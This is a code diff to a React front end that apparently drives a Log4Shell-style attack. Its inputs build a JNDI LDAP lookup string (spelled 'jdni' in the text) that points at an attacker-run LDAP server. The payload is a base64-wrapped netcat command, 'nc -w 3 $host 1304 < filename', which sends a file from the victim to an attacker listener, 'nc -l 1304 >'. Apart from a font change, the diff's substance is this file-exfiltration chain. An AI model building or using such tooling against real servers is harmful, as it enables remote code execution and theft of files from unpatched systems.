@@ -151,7 +151,7 @@ const HomePage = () => {
             <Box>
                 <Box border='lg' borderWidth='1px' borderRadius='lg' overflow='hidden' px={4} py={4} my={4}>
                     <Text fontSize='xl' fontWeight='bold' ml={1}>Host related</Text>
-                    <InputGroup size='md' mt={4}>
+                    <InputGroup size='md' mt={4} fontFamily={'JetBrains Mono'}>
                         <Input
                             pr='4.5rem'
                             placeholder='Command'
@@ -164,8 +164,8 @@ const HomePage = () => {
                             </Button>
                         </InputRightElement>
                     </InputGroup>
-                    <InputGroup size='md' mt={4}>
-                        <InputLeftAddon>nc -w 3 {state.intIP} 1304 &gt; </InputLeftAddon>
+                    <InputGroup size='md' mt={4} fontFamily={'JetBrains Mono'}>
+                        <InputLeftAddon>nc -l 1304 &gt; </InputLeftAddon>
                         <Input
                             pr='4.5rem'
                             placeholder='Filename'
@@ -176,7 +176,7 @@ const HomePage = () => {
                 </Box>
                 <Box border='lg' borderWidth='1px' borderRadius='lg' overflow='hidden' px={4} py={4} my={4}>
                     <Text fontSize='xl' fontWeight='bold' ml={1}>Target related</Text>
-                    <InputGroup size='md' mt={4}>
+                    <InputGroup size='md' mt={4} fontFamily={'JetBrains Mono'}>
                         <Input
                             pr='4.5rem'
                             placeholder='Target IP Address'
@@ -185,11 +185,11 @@ const HomePage = () => {
                         />
                         <InputRightAddon>:8080</InputRightAddon>
                     </InputGroup>
-                    <InputGroup size='md' mt={4}>
+                    <InputGroup size='md' mt={4} fontFamily={'JetBrains Mono'}>
                         <InputLeftAddon>&#123;jdni:ldap://{state.intIP}:1389/Basic/Command/Base64/</InputLeftAddon>
                         <Input
                             pr='4.5rem'
-                            placeholder='nc -l -p 1304 &lt; filename'
+                            placeholder='nc -w 3 $host 1304 &lt; filename'
                             value={state.payload}
                             onChange={(e) => setState((prevState) => ({ ...prevState, payload: e.target.value }))}
                         />
